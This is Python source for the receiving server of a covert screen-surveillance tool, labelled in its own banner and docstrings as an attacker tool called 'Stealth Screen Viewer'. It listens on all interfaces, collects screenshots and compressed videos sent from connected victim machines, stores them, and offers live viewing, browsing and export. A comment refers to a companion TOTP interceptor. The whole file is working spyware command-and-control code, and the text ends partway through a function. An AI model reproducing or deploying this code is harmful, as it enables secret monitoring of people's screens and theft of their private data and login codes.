import socket
import threading
import time
import datetime
import os
import sys
import base64
import zlib
import shutil
from queue import Queue
 
try:
    import colorama
    from colorama import Fore, Back, Style
    colorama.init(autoreset=True)  # Initialize colorama with autoreset
    COLOR_SUPPORT = True
except ImportError:
    # Fallback if colorama is not installed
    class DummyFore:
        def __getattr__(self, name):
            return ""
    class DummyStyle:
        def __getattr__(self, name):
            return ""
    Fore = DummyFore()
    Style = DummyStyle()
    COLOR_SUPPORT = False
 
try:
    import numpy as np
    import cv2
    OPENCV_AVAILABLE = True
except ImportError:
    OPENCV_AVAILABLE = False
    print(f"{Fore.RED}[!] OpenCV not installed. Install with: pip install opencv-python{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[!] Some features will be limited.{Style.RESET_ALL}")
 
try:
    from PIL import Image
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False
    print(f"{Fore.RED}[!] PIL not installed. Install with: pip install pillow{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[!] Some features will be limited.{Style.RESET_ALL}")
 
# Server configuration
HOST = "0.0.0.0"  # Listen on all interfaces
PORT = 5555  # Different from the TOTP interceptor port
 
# Directories for storing received data
SCREENSHOT_DIR = "captured_screens"
VIDEO_DIR = "captured_videos"
os.makedirs(SCREENSHOT_DIR, exist_ok=True)
os.makedirs(VIDEO_DIR, exist_ok=True)
 
# Client connections
clients = {}  # Store client connections by IP
active_viewers = set()  # Track which client screens are being viewed
 
# Message queue for UI updates
message_queue = Queue()
 
# Last notification time
last_notification_time = 0
notification_message = ""
notification_color = Fore.GREEN

# Window size configuration for viewers
DEFAULT_WINDOW_WIDTH = 1024
DEFAULT_WINDOW_HEIGHT = 768
 
def display_banner():
    """Display a banner for the attacker tool"""
    if COLOR_SUPPORT:
        banner = f"""
{Fore.CYAN}╔═══════════════════════════════════════════════════════════╗
║ {Fore.RED}███████╗██████╗ ██╗   ██╗ {Fore.CYAN}███████╗██████╗ ██╗   ██╗{Fore.CYAN}  ║
║ {Fore.RED}██╔════╝██╔══██╗╚██╗ ██╔╝ {Fore.CYAN}██╔════╝██╔══██╗╚██╗ ██╔╝{Fore.CYAN}  ║
║ {Fore.RED}███████╗██████╔╝ ╚████╔╝  {Fore.CYAN}███████╗██████╔╝ ╚████╔╝ {Fore.CYAN}  ║
║ {Fore.RED}╚════██║██╔═══╝   ╚██╔╝   {Fore.CYAN}╚════██║██╔═══╝   ╚██╔╝  {Fore.CYAN}  ║
║ {Fore.RED}███████║██║        ██║    {Fore.CYAN}███████║██║        ██║   {Fore.CYAN}  ║
║ {Fore.RED}╚══════╝╚═╝        ╚═╝    {Fore.CYAN}╚══════╝╚═╝        ╚═╝   {Fore.CYAN}  ║
╠═══════════════════════════════════════════════════════════╣
║ {Fore.YELLOW}             STEALTH SCREEN VIEWER v2.0               {Fore.CYAN} ║
╚═══════════════════════════════════════════════════════════╝{Style.RESET_ALL}
        """
    else:
        banner = """
=================================================================
|                    STEALTH SCREEN VIEWER v2.0                 |
=================================================================
        """
    return banner
 
def clear_screen():
    """Clear the console screen"""
    os.system('cls' if os.name == 'nt' else 'clear')
 
def display_status_bar():
    """Display status bar with connection info and notifications"""
    global last_notification_time, notification_message, notification_color
 
    # Current time for status bar
    current_time = datetime.datetime.now().strftime("%H:%M:%S")
 
    # Connection status
    conn_status = f"{Fore.GREEN}▲ ONLINE" if clients else f"{Fore.RED}▼ OFFLINE"
 
    # Active viewer status
    viewers = len(active_viewers)
    viewer_status = f"{Fore.CYAN} {viewers}" if viewers > 0 else ""
 
    # Status bar
    status_line = f"{Fore.WHITE}[{current_time}] {conn_status} | {len(clients)} connections {viewer_status}"
 
    # Check if notification should be shown
    notification_line = ""
    if time.time() - last_notification_time < 5:  # Show notification for 5 seconds
        notification_line = f"\n{notification_color}{notification_message}{Style.RESET_ALL}"
 
    return status_line + notification_line
 
def show_notification(message, color=Fore.GREEN):
    """Show a notification in the status bar"""
    global last_notification_time, notification_message, notification_color
    notification_message = message
    notification_color = color
    last_notification_time = time.time()
 
def handle_client(client_socket, client_address):
    """Handle communication with a connected client"""
    global clients
 
    show_notification(f"New connection from {client_address[0]}:{client_address[1]}")
 
    # Add to clients dictionary
    clients[client_address[0]] = {
        "socket": client_socket,
        "address": client_address,
        "connected_time": datetime.datetime.now(),
        "last_screenshot": None,
        "screenshot_count": 0,
        "video_count": 0,
        "last_image": None,  # Store the latest screenshot in memory
        "frame_buffer": []   # Buffer for video frames
    }
 
    # Data buffer
    buffer = ""
 
    # Current transfer state
    current_transfer = {
        "type": None,
        "filename": None,
        "size": 0,
        "data": bytearray(),
        "receiving": False
    }
 
    try:
        while True:
            # Receive data
            data = client_socket.recv(4096)
            if not data:
                break
 
            # Process the received data
            if current_transfer["receiving"]:
                # We're in the middle of a file transfer
                if data.endswith(b"END\n"):
                    # End of transfer
                    current_transfer["data"].extend(data[:-4])  # Exclude the END\n
                    process_completed_transfer(current_transfer, client_address[0])
                    current_transfer = {
                        "type": None,
                        "filename": None,
                        "size": 0,
                        "data": bytearray(),
                        "receiving": False
                    }
                else:
                    # Continue receiving data
                    current_transfer["data"].extend(data)
            else:
                # Convert bytes to string and add to buffer
                text_data = data.decode('utf-8', errors='ignore')
                buffer += text_data
 
                # Process complete messages (if any)
                while '\n' in buffer:
                    line, buffer = buffer.split('\n', 1)
 
                    # Check for screenshot or video header
                    if line.startswith("SCREENSHOT:") or line.startswith("VIDEO:"):
                        parts = line.split(":")
 
                        if line.startswith("SCREENSHOT:"):
                            current_transfer["type"] = "screenshot"
                            current_transfer["filename"] = parts[1]  # timestamp
                            current_transfer["size"] = int(parts[2])
                        else:  # VIDEO
                            current_transfer["type"] = "video"
                            current_transfer["filename"] = parts[1]
                            current_transfer["size"] = int(parts[2])
 
                        current_transfer["receiving"] = True
                        current_transfer["data"] = bytearray()
 
                        # If there's data in buffer, it's part of the file
                        if buffer:
                            if buffer.endswith("END\n"):
                                # The entire file is in the buffer
                                current_transfer["data"].extend(buffer[:-4].encode())
                                process_completed_transfer(current_transfer, client_address[0])
                                current_transfer = {
                                    "type": None,
                                    "filename": None,
                                    "size": 0,
                                    "data": bytearray(),
                                    "receiving": False
                                }
                                buffer = ""
                            else:
                                # Part of the file is in the buffer
                                current_transfer["data"].extend(buffer.encode())
                                buffer = ""
 
    except Exception as e:
        show_notification(f"Error handling client {client_address[0]}: {str(e)[:50]}", Fore.RED)
    finally:
        # Clean up
        if client_address[0] in clients:
            del clients[client_address[0]]
        if client_address[0] in active_viewers:
            active_viewers.remove(client_address[0])
        try:
            client_socket.close()
        except:
            pass
        show_notification(f"Client {client_address[0]} disconnected", Fore.YELLOW)
 
def process_completed_transfer(transfer, client_ip):
    """Process a completed file transfer"""
    global clients
 
    if transfer["type"] == "screenshot":
        # Decode base64 data
        try:
            img_data = base64.b64decode(transfer["data"])
 
            # Save the screenshot
            timestamp = transfer["filename"]
            filename = f"{SCREENSHOT_DIR}/screenshot_{client_ip.replace('.', '-')}_{timestamp}.jpg"
 
            with open(filename, "wb") as f:
                f.write(img_data)
 
            # Update client stats
            if client_ip in clients:
                clients[client_ip]["last_screenshot"] = datetime.datetime.now()
                clients[client_ip]["screenshot_count"] += 1
 
                # Store the image in memory for live viewing
                if OPENCV_AVAILABLE:
                    try:
                        img_np = np.frombuffer(img_data, np.uint8)
                        img = cv2.imdecode(img_np, cv2.IMREAD_COLOR)
                        
                        if img is not None:
                            clients[client_ip]["last_image"] = img
                            
                            # If this client is being actively viewed, update the display
                            if client_ip in active_viewers:
                                update_live_view(client_ip)
                    except Exception as e:
                        show_notification(f"Error processing image: {str(e)[:50]}", Fore.RED)
 
            # Display notification (but don't interrupt the UI)
            show_notification(f"Screenshot received from {client_ip}")
 
        except Exception as e:
            show_notification(f"Error processing screenshot: {str(e)[:50]}", Fore.RED)
 
    elif transfer["type"] == "video":
        # Process video
        try:
            # Decode base64 data
            encoded_data = transfer["data"]
            compressed_data = base64.b64decode(encoded_data)
 
            # Decompress
            video_data = zlib.decompress(compressed_data)
 
            # Save the video
            filename = f"{VIDEO_DIR}/{transfer['filename']}"
            with open(filename, "wb") as f:
                f.write(video_data)
 
            # Update client stats
            if client_ip in clients:
                clients[client_ip]["video_count"] += 1
 
                # Add to frame buffer for live viewing if this is a video stream
                if filename.endswith('.mp4') and OPENCV_AVAILABLE:
                    try:
                        cap = cv2.VideoCapture(filename)
                        while True:
                            ret, frame = cap.read()
                            if not ret:
                                break
                            clients[client_ip]["frame_buffer"].append(frame)
                        cap.release()
                    except Exception as e:
                        show_notification(f"Error processing video frames: {str(e)[:50]}", Fore.RED)
 
            show_notification(f"Video received from {client_ip} - saved as {os.path.basename(filename)}")
 
        except Exception as e:
            show_notification(f"Error processing video: {str(e)[:50]}", Fore.RED)
 
def update_live_view(client_ip):
    """Update the live view window for a client"""
    if not OPENCV_AVAILABLE or client_ip not in clients:
        return
 
    img = clients[client_ip]["last_image"]
    if img is not None:
        # Create a copy to avoid modifying the original
        display_img = img.copy()
        
        # Get image dimensions
        h, w = display_img.shape[:2]
        
        # Add timestamp overlay
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        cv2.putText(display_img, f"{client_ip} - {timestamp}", (10, 30), 
                    cv2.FONT_HERSHEY_SIMPLEX, 0.7, (0, 255, 0), 2)
 
        # Create window with proper properties
        window_name = f"Live View - {client_ip}"
        cv2.namedWindow(window_name, cv2.WINDOW_NORMAL)
        
        # Set window size based on image dimensions but ensure minimum size
        window_width = max(DEFAULT_WINDOW_WIDTH, w)
        window_height = max(DEFAULT_WINDOW_HEIGHT, h)
        cv2.resizeWindow(window_name, window_width, window_height)
 
        # Show image
        cv2.imshow(window_name, display_img)
        cv2.waitKey(1)  # Update the window without blocking
 
def start_screen_viewer(client_ip):
    """Start a live screen viewer for a specific client"""
    global active_viewers
 
    if not OPENCV_AVAILABLE:
        show_notification("OpenCV is required for live viewing.", Fore.RED)
        return
 
    if client_ip not in clients:
        show_notification(f"Client {client_ip} is not connected.", Fore.RED)
        return
 
    # Add to active viewers
    active_viewers.add(client_ip)
 
    # Create a window for this client
    window_name = f"Live View - {client_ip}"
    cv2.namedWindow(window_name, cv2.WINDOW_NORMAL)
    cv2.resizeWindow(window_name, DEFAULT_WINDOW_WIDTH, DEFAULT_WINDOW_HEIGHT)
 
    # If we already have an image, display it immediately
    if clients[client_ip]["last_image"] is not None:
        update_live_view(client_ip)
 
    show_notification(f"Live viewing started for {client_ip}.")
    
    # Start a refresh thread to continuously update the view
    def refresh_view():
        while client_ip in active_viewers and client_ip in clients:
            update_live_view(client_ip)
            time.sleep(0.5)  # Update every 500ms
    
    refresh_thread = threading.Thread(target=refresh_view)
    refresh_thread.daemon = True
    refresh_thread.start()
 
def stop_screen_viewer(client_ip):
    """Stop the live screen viewer for a client"""
    global active_viewers
 
    if client_ip in active_viewers:
        active_viewers.remove(client_ip)
 
        if OPENCV_AVAILABLE:
            try:
                cv2.destroyWindow(f"Live View - {client_ip}")
            except:
                pass
 
        show_notification(f"Live viewing stopped for {client_ip}.")
 
def render_ui():
    """Render the main UI"""
    clear_screen()
    print(display_banner())
    print(display_status_bar())
 
    # Additional UI elements can be added here
    print(f"\n{Fore.CYAN}==== Stealth Screen Viewer Menu ===={Style.RESET_ALL}")
    print(f"{Fore.WHITE}1. Show connected clients")
    print(f"2. View live screen")
    print(f"3. Browse saved screenshots")
    print(f"4. Browse saved videos")
    print(f"5. Manage files")
    print(f"6. Exit{Style.RESET_ALL}")
 
    print(f"\n{Fore.GREEN}Select an option: {Style.RESET_ALL}", end="", flush=True)
 
def display_menu():
    """Display an interactive menu for the attacker"""
    while True:
        render_ui()
 
        choice = input()
 
        if choice == "1":
            display_clients()
        elif choice == "2":
            view_live_screen_menu()
        elif choice == "3":
            browse_screenshots_menu()
        elif choice == "4":
            browse_videos_menu()
        elif choice == "5":
            manage_files_menu()
        elif choice == "6":
            clear_screen()
            close_all_viewers()
            print(f"{Fore.YELLOW}Exiting Stealth Screen Viewer...{Style.RESET_ALL}")
            break
        else:
            show_notification("Invalid option. Please try again.", Fore.RED)
            time.sleep(1)
 
def display_clients():
    """Show all connected clients"""
    clear_screen()
    print(display_banner())
    print(f"\n{Fore.YELLOW}--- Connected Clients ---{Style.RESET_ALL}")
 
    if not clients:
        print(f"{Fore.RED}No clients connected.{Style.RESET_ALL}")
    else:
        # Table header
        print(f"{Fore.CYAN}{'IP Address':<16} {'Connected Since':<20} {'Screenshots':<12} {'Videos':<8} {'Status':<15}{Style.RESET_ALL}")
        print("-" * 70)
 
        for ip, details in clients.items():
            connected_time = details["connected_time"].strftime("%Y-%m-%d %H:%M:%S")
            screenshots = details["screenshot_count"]
            videos = details["video_count"]
 
            status = f"{Fore.CYAN}[LIVE VIEW]" if ip in active_viewers else f"{Fore.GREEN}[CONNECTED]"
 
            print(f"{ip:<16} {connected_time:<20} {screenshots:<12} {videos:<8} {status}{Style.RESET_ALL}")
 
    input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")
 
def view_live_screen_menu():
    """Menu for selecting a client to view live"""
    while True:
        clear_screen()
        print(display_banner())
        print(display_status_bar())
        print(f"\n{Fore.YELLOW}--- Live Screen Viewing ---{Style.RESET_ALL}")
 
        if not clients:
            print(f"{Fore.RED}No clients connected.{Style.RESET_ALL}")
            input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")
            return
 
        print(f"{Fore.WHITE}Select a client to view:{Style.RESET_ALL}\n")
 
        # Display client list
        client_ips = list(clients.keys())
        for i, ip in enumerate(client_ips):
            status = f"{Fore.CYAN}[LIVE VIEWING]{Style.RESET_ALL}" if ip in active_viewers else f"{Fore.GREEN}[CONNECTED]{Style.RESET_ALL}"
            print(f"{i+1}. {ip} {status}")
 
        print(f"\n{len(client_ips)+1}. Back to main menu")
 
        try:
            choice = input(f"\n{Fore.GREEN}Select a client (or 'r' to refresh): {Style.RESET_ALL}")
 
            if choice.lower() == 'r':
                continue
 
            if choice == str(len(client_ips) + 1):
                return
 
            choice = int(choice)
            if 1 <= choice <= len(client_ips):
                selected_ip = client_ips[choice-1]
 
                if selected_ip in active_viewers:
                    # Already viewing, ask to stop
                    print(f"{Fore.YELLOW}Already viewing this client. Stop viewing?{Style.RESET_ALL}")
                    stop_choice = input(f"{Fore.GREEN}(y/n): {Style.RESET_ALL}").lower()
 
                    if stop_choice == 'y':
                        stop_screen_viewer(selected_ip)
                else:
                    # Start viewing
                    start_screen_viewer(selected_ip)
            else:
                show_notification("Invalid selection.", Fore.RED)
                time.sleep(1)
        except ValueError:
            show_notification("Please enter a number.", Fore.RED)
            time.sleep(1)
 
def browse_screenshots_menu():
    """Menu for browsing saved screenshots"""
    clear_screen()
    print(display_banner())
    print(display_status_bar())
    print(f"\n{Fore.YELLOW}--- Browse Screenshots ---{Style.RESET_ALL}")
 
    screenshots = [f for f in os.listdir(SCREENSHOT_DIR) if f.endswith('.jpg')]
 
    if not screenshots:
        print(f"{Fore.RED}No screenshots saved.{Style.RESET_ALL}")
        input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")
        return
 
    # Group screenshots by client
    clients_screenshots = {}
    for screenshot in screenshots:
        parts = screenshot.split('_')
        if len(parts) >= 2:
            client = parts[1].replace('-', '.')
            if client not in clients_screenshots:
                clients_screenshots[client] = []
            clients_screenshots[client].append(screenshot)
 
    # Display client list
    print(f"{Fore.WHITE}Select a client:{Style.RESET_ALL}")
    client_ips = list(clients_screenshots.keys())
    for i, ip in enumerate(client_ips):
        print(f"{i+1}. {ip} ({len(clients_screenshots[ip])} screenshots)")
 
    print(f"{len(client_ips)+1}. Back to main menu")
 
    try:
        choice = int(input(f"\n{Fore.GREEN}Select a client: {Style.RESET_ALL}"))
 
        if choice == len(client_ips) + 1:
            return
 
        if 1 <= choice <= len(client_ips):
            selected_ip = client_ips[choice-1]
            view_screenshots(clients_screenshots[selected_ip])
        else:
            show_notification("Invalid selection.", Fore.RED)
            time.sleep(1)
    except ValueError:
        show_notification("Please enter a number.", Fore.RED)
        time.sleep(1)
 
def view_screenshots(screenshots):
    """View screenshots for a specific client"""
    if not OPENCV_AVAILABLE:
        show_notification("OpenCV is required for viewing screenshots.", Fore.RED)
        input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")
        return
 
    # Sort screenshots by timestamp (newest first)
    screenshots.sort(reverse=True)
 
    current_index = 0
 
    while True:
        # Load and display the current screenshot in a window
        img_path = os.path.join(SCREENSHOT_DIR, screenshots[current_index])
        img = cv2.imread(img_path)
 
        if img is None:
            show_notification(f"Error loading image: {screenshots[current_index]}", Fore.RED)
            time.sleep(1)
            continue
 
        # Create a copy to avoid modifying the original
        display_img = img.copy()
        
        # Get image dimensions
        h, w = display_img.shape[:2]
        
        # Add file info overlay with larger text and better visibility
        filename = screenshots[current_index]
        timestamp = filename.split('_')[-1].split('.')[0]  # Extract timestamp from filename
        timestamp = f"{timestamp[:8]} {timestamp[9:11]}:{timestamp[11:13]}:{timestamp[13:15]}"
        
        # Add a dark background for the text to make it more visible
        cv2.rectangle(display_img, (5, 5), (400, 100), (0, 0, 0, 128), -1)
        
        # Add timestamp with larger text
        cv2.putText(display_img, f"Date: {timestamp}", (10, 30), 
                   cv2.FONT_HERSHEY_SIMPLEX, 0.9, (0, 255, 0), 2)
 
        # Show image index with larger text
        info_text = f"Image {current_index + 1} of {len(screenshots)}"
        cv2.putText(display_img, info_text, (10, 70), 
                   cv2.FONT_HERSHEY_SIMPLEX, 0.9, (0, 255, 0), 2)
        
        # Add controls directly to the image for better visibility
        controls_text = "NEXT: → or N | PREV: ← or P | SAVE: S | QUIT: Q or ESC"
        cv2.rectangle(display_img, (5, h-40), (w-5, h-5), (0, 0, 0, 128), -1)
        cv2.putText(display_img, controls_text, (10, h-15), 
                   cv2.FONT_HERSHEY_SIMPLEX, 0.7, (255, 255, 255), 2)
 
        # Show the image
        window_name = "Screenshot Viewer"
        cv2.namedWindow(window_name, cv2.WINDOW_NORMAL)
        
        # Set window size based on image dimensions but ensure minimum size
        window_width = max(DEFAULT_WINDOW_WIDTH, w)
        window_height = max(DEFAULT_WINDOW_HEIGHT, h)
        cv2.resizeWindow(window_name, window_width, window_height)
        
        cv2.imshow(window_name, display_img)
 
        # Show controls in terminal
        clear_screen()
        print(f"{Fore.YELLOW}--- Screenshot Viewer ---{Style.RESET_ALL}")
        print(f"{Fore.WHITE}Viewing screenshot {current_index + 1} of {len(screenshots)}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}Filename: {screenshots[current_index]}{Style.RESET_ALL}")
        print(f"\n{Fore.CYAN}Controls:{Style.RESET_ALL}")
        print(f"{Fore.WHITE}→ or N - Next screenshot{Style.RESET_ALL}")
        print(f"{Fore.WHITE}← or P - Previous screenshot{Style.RESET_ALL}")
        print(f"{Fore.WHITE}S - Save to desktop{Style.RESET_ALL}")
        print(f"{Fore.WHITE}Q - Return to menu{Style.RESET_ALL}")
 
        # Wait for key press
        key = cv2.waitKey(0) & 0xFF
 
        if key == ord('q') or key == 27:  # 'q' or ESC
            cv2.destroyAllWindows()
            break
        elif key == ord('n') or key == 83:  # 'n' or right arrow
            current_index = (current_index + 1) % len(screenshots)
        elif key == ord('p') or key == 81:  # 'p' or left arrow
            current_index = (current_index - 1) % len(screenshots)
        elif key == ord('s'):  # 's' to save
            # Save to desktop
            desktop = os.path.join(os.path.expanduser('~'), 'Desktop')
            if os.path.exists(desktop):
                target_path = os.path.join(desktop, screenshots[current_index])
                try:
                    shutil.copy2(img_path, target_path)
                    show_notification(f"Saved to desktop: {screenshots[current_index]}")
                except Exception as e:
                    show_notification(f"Error saving: {str(e)[:50]}", Fore.RED)
            else:
                show_notification("Desktop path not found", Fore.RED)
 
def browse_videos_menu():
    """Menu for browsing saved videos"""
    clear_screen()
    print(display_banner())
    print(display_status_bar())
    print(f"\n{Fore.YELLOW}--- Browse Videos ---{Style.RESET_ALL}")
 
    videos = [f for f in os.listdir(VIDEO_DIR) if f.endswith('.mp4')]
 
    if not videos:
        print(f"{Fore.RED}No videos saved.{Style.RESET_ALL}")
        input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")
        return
 
    # Sort videos by timestamp
    videos.sort(reverse=True)  # Most recent first
 
    # Display video list
    print(f"{Fore.WHITE}Select a video to play:{Style.RESET_ALL}")
    for i, video in enumerate(videos):
        # Extract timestamp from filename
        try:
            timestamp = video.split('_')[-1].split('.')[0]
            print(f"{i+1}. {video}")
        except:
            print(f"{i+1}. {video}")
 
    print(f"{len(videos)+1}. Back to main menu")
 
    try:
        choice = int(input(f"\n{Fore.GREEN}Select a video: {Style.RESET_ALL}"))
 
        if choice == len(videos) + 1:
            return
 
        if 1 <= choice <= len(videos):
            selected_video = videos[choice-1]
            play_video(os.path.join(VIDEO_DIR, selected_video))
        else:
            show_notification("Invalid selection.", Fore.RED)
            time.sleep(1)
    except ValueError:
        show_notification("Please enter a number.", Fore.RED)
        time.sleep(1)
 
def play_video(video_path):
    """Play a video file with improved controls"""
    if not OPENCV_AVAILABLE:
        show_notification("OpenCV is required for playing videos.", Fore.RED)
        input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")
        return

    try:
        # Open the video file
        cap = cv2.VideoCapture(video_path)
        if not cap.isOpened():
            show_notification(f"Error opening video file: {os.path.basename(video_path)}", Fore.RED)
            input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")
            return

        # Get video properties
        fps = cap.get(cv2.CAP_PROP_FPS)
        frame_count = int(cap.get(cv2.CAP_PROP_FRAME_COUNT))
        duration = frame_count / fps if fps > 0 else 0
        
        # Variables for video control
        playing = True
        current_frame = 0
        playback_speed = 1.0  # Normal speed

        # Create window
        window_name = "Video Player"
        cv2.namedWindow(window_name, cv2.WINDOW_NORMAL)
        
        # Get video dimensions
        ret, frame = cap.read()
        if not ret:
            show_notification("Error reading video frame", Fore.RED)
            return
        
        h, w = frame.shape[:2]
        cap.set(cv2.CAP_PROP_POS_FRAMES, 0)  # Reset to first frame
        
        # Set window size
        window_width = max(DEFAULT_WINDOW_WIDTH, w)
        window_height = max(DEFAULT_WINDOW_HEIGHT, h)
        cv2.resizeWindow(window_name, window_width, window_height)

        # Show controls in terminal
        def show_player_info():
            clear_screen()
            print(f"{Fore.YELLOW}--- Video Player ---{Style.RESET_ALL}")
            print(f"{Fore.WHITE}Playing: {os.path.basename(video_path)}{Style.RESET_ALL}")
            print(f"{Fore.WHITE}Duration: {duration:.2f} seconds ({frame_count} frames){Style.RESET_ALL}")
            print(f"{Fore.WHITE}Current position: {current_frame/frame_count*100:.1f}% (Frame {current_frame}/{frame_count}){Style.RESET_ALL}")
            print(f"{Fore.WHITE}Playback speed: {playback_speed}x{Style.RESET_ALL}")
            print(f"\n{Fore.CYAN}Controls:{Style.RESET_ALL}")
            print(f"{Fore.WHITE}Space - Play/Pause{Style.RESET_ALL}")
            print(f"{Fore.WHITE}→ - Forward 5 seconds{Style.RESET_ALL}")
            print(f"{Fore.WHITE}← - Backward 5 seconds{Style.RESET_ALL}")
            print(f"{Fore.WHITE}+ - Increase speed{Style.RESET_ALL}")
            print(f"{Fore.WHITE}- - Decrease speed{Style.RESET_ALL}")
            print(f"{Fore.WHITE}S - Save to desktop{Style.RESET_ALL}")
            print(f"{Fore.WHITE}Q or ESC - Return to menu{Style.RESET_ALL}")

        show_player_info()

        while True:
            if playing:
                # Read a frame from the video
                ret, frame = cap.read()
                
                # If we reached the end of the video, loop back to the beginning
                if not ret:
                    cap.set(cv2.CAP_PROP_POS_FRAMES, 0)
                    current_frame = 0
                    continue
                
                current_frame = int(cap.get(cv2.CAP_PROP_POS_FRAMES))
                
                # Add overlay information
                display_frame = frame.copy()
                
                # Progress info
                progress_text = f"Frame: {current_frame}/{frame_count} ({current_frame/frame_count*100:.1f}%)"
                time_text = f"Time: {current_frame/fps:.2f}s / {duration:.2f}s"
                speed_text = f"Speed: {playback_speed}x"
                
                # Add a dark background for the text
                cv2.rectangle(display_frame, (5, 5), (400, 100), (0, 0, 0, 128), -1)
                
                # Add text with larger font
                cv2.putText(display_frame, progress_text, (10, 30), 
                          cv2.FONT_HERSHEY_SIMPLEX, 0.7, (0, 255, 0), 2)
                cv2.putText(display_frame, time_text, (10, 60), 
                          cv2.FONT_HERSHEY_SIMPLEX, 0.7, (0, 255, 0), 2)
                cv2.putText(display_frame, speed_text, (10, 90), 
                          cv2.FONT_HERSHEY_SIMPLEX, 0.7, (0, 255, 0), 2)
                
                # Add controls directly to the image
                controls_text = "SPACE: Play/Pause | ←/→: Seek | +/-: Speed | Q: Quit"
                cv2.rectangle(display_frame, (5, h-40), (w-5, h-5), (0, 0, 0, 128), -1)
                cv2.putText(display_frame, controls_text, (10, h-15), 
                          cv2.FONT_HERSHEY_SIMPLEX, 0.7, (255, 255, 255), 2)
                
                # Display the frame
                cv2.imshow(window_name, display_frame)
            
            # Wait for keyboard input (with appropriate delay based on playback speed)
            delay = int(1000 / (fps * playback_speed)) if playing else 0
            key = cv2.waitKey(max(1, delay)) & 0xFF
            
            if key == ord('q') or key == 27:  # 'q' or ESC to quit
                break
            elif key == 32:  # Space bar to toggle play/pause
                playing = not playing
                show_player_info()
            elif key == 83:  # Right arrow - forward 5 seconds
                current_pos = cap.get(cv2.CAP_PROP_POS_FRAMES)
                new_pos = min(frame_count - 1, current_pos + fps * 5)
                cap.set(cv2.CAP_PROP_POS_FRAMES, new_pos)
                current_frame = int(new_pos)
                show_player_info()
            elif key == 81:  # Left arrow - backward 5 seconds
                current_pos = cap.get(cv2.CAP_PROP_POS_FRAMES)
                new_pos = max(0, current_pos - fps * 5)
                cap.set(cv2.CAP_PROP_POS_FRAMES, new_pos)
                current_frame = int(new_pos)
                show_player_info()
            elif key == ord('+'):  # Increase speed
                playback_speed = min(4.0, playback_speed + 0.25)
                show_player_info()
            elif key == ord('-'):  # Decrease speed
                playback_speed = max(0.25, playback_speed - 0.25)
                show_player_info()
            elif key == ord('s'):  # Save to desktop
                desktop = os.path.join(os.path.expanduser('~'), 'Desktop')
                if os.path.exists(desktop):
                    filename = os.path.basename(video_path)
                    target_path = os.path.join(desktop, filename)
                    try:
                        shutil.copy2(video_path, target_path)
                        show_notification(f"Saved to desktop: {filename}")
                    except Exception as e:
                        show_notification(f"Error saving: {str(e)[:50]}", Fore.RED)
                else:
                    show_notification("Desktop path not found", Fore.RED)
        
        # Clean up
        cap.release()
        cv2.destroyAllWindows()
        
    except Exception as e:
        show_notification(f"Error playing video: {str(e)[:50]}", Fore.RED)
        time.sleep(1)

def manage_files_menu():
    """Menu for managing saved files"""
    while True:
        clear_screen()
        print(display_banner())
        print(display_status_bar())
        print(f"\n{Fore.YELLOW}--- File Management ---{Style.RESET_ALL}")
        
        print(f"{Fore.WHITE}1. Delete all screenshots")
        print(f"2. Delete all videos")
        print(f"3. View storage usage")
        print(f"4. Export data")
        print(f"5. Back to main menu{Style.RESET_ALL}")
        
        choice = input(f"\n{Fore.GREEN}Select an option: {Style.RESET_ALL}")
        
        if choice == "1":
            confirm = input(f"{Fore.RED}Are you sure you want to delete all screenshots? (y/n): {Style.RESET_ALL}").lower()
            if confirm == 'y':
                try:
                    screenshots = [f for f in os.listdir(SCREENSHOT_DIR) if f.endswith('.jpg')]
                    for screenshot in screenshots:
                        os.remove(os.path.join(SCREENSHOT_DIR, screenshot))
                    show_notification(f"Deleted {len(screenshots)} screenshots.")
                except Exception as e:
                    show_notification(f"Error deleting screenshots: {str(e)[:50]}", Fore.RED)
        
        elif choice == "2":
            confirm = input(f"{Fore.RED}Are you sure you want to delete all videos? (y/n): {Style.RESET_ALL}").lower()
            if confirm == 'y':
                try:
                    videos = [f for f in os.listdir(VIDEO_DIR) if f.endswith('.mp4')]
                    for video in videos:
                        os.remove(os.path.join(VIDEO_DIR, video))
                    show_notification(f"Deleted {len(videos)} videos.")
                except Exception as e:
                    show_notification(f"Error deleting videos: {str(e)[:50]}", Fore.RED)
        
        elif choice == "3":
            view_storage_usage()
        
        elif choice == "4":
            export_data_menu()
        
        elif choice == "5":
            return
        
        else:
            show_notification("Invalid option. Please try again.", Fore.RED)
            time.sleep(1)

def view_storage_usage():
    """Display storage usage information"""
    clear_screen()
    print(display_banner())
    print(display_status_bar())
    print(f"\n{Fore.YELLOW}--- Storage Usage ---{Style.RESET_ALL}")
    
    # Calculate screenshot storage
    screenshots = [f for f in os.listdir(SCREENSHOT_DIR) if f.endswith('.jpg')]
    screenshot_size = sum(os.path.getsize(os.path.join(SCREENSHOT_DIR, f)) for f in screenshots)
    
    # Calculate video storage
    videos = [f for f in os.listdir(VIDEO_DIR) if f.endswith('.mp4')]
    video_size = sum(os.path.getsize(os.path.join(VIDEO_DIR, f)) for f in videos)
    
    # Total storage
    total_size = screenshot_size + video_size
    
    # Convert to appropriate units
    def format_size(size_bytes):
        if size_bytes < 1024:
            return f"{size_bytes} B"
        elif size_bytes < 1024**2:
            return f"{size_bytes/1024:.2f} KB"
        elif size_bytes < 1024**3:
            return f"{size_bytes/(1024**2):.2f} MB"
        else:
            return f"{size_bytes/(1024**3):.2f} GB"
    
    print(f"{Fore.CYAN}Screenshots: {len(screenshots)} files ({format_size(screenshot_size)})")
    print(f"{Fore.CYAN}Videos: {len(videos)} files ({format_size(video_size)})")
    print(f"{Fore.GREEN}Total storage used: {format_size(total_size)}{Style.RESET_ALL}")
    
    input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")

def export_data_menu():
    """Menu for exporting captured data"""
    clear_screen()
    print(display_banner())
    print(display_status_bar())
